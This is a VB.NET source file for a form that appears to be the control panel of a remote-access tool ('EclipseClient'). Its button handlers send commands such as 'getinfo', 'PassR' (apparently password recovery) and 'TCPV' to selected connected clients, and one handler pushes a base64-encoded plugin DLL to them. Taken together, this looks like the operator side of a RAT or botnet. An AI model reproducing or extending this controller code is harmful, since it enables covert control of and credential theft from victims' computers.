Imports System.Web.UI.WebControls
Imports System.IO

Public Class Client_Menager
    Dim C As Client
    Public Shared username_server As String

    Private Sub Label10_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label9_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs) Handles Guna2Button2.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("getinfo")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub Client_Menager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Label6.Text = String.Format("{1}", AuthForm.Lv1.Items.Count.ToString, AuthForm.Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
        Label5.Text = String.Format("{0}", AuthForm.Lv1.Items.Count.ToString, AuthForm.Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
        Label10.Text = username_server
    End Sub

    Private Sub Guna2Button11_Click(sender As Object, e As EventArgs) Handles Guna2Button11.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PRG")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button12_Click(sender As Object, e As EventArgs) Handles Guna2Button12.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ACT")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button22_Click(sender As Object, e As EventArgs) Handles Guna2Button22.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("|||")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button37_Click(sender As Object, e As EventArgs) Handles Guna2Button37.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("TCPV")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button41_Click(sender As Object, e As EventArgs) Handles Guna2Button41.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("xxx")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub Guna2Button40_Click(sender As Object, e As EventArgs) Handles Guna2Button40.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ppp")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button39_Click(sender As Object, e As EventArgs) Handles Guna2Button39.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("cbb")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button38_Click(sender As Object, e As EventArgs) Handles Guna2Button38.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("JustFun" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Pastime.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button15_Click(sender As Object, e As EventArgs) Handles Guna2Button15.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PassR")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Page10_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2ControlBox3_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2ControlBox4_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Label10_Click_1(sender As Object, e As EventArgs) Handles Label10.Click

    End Sub
End Class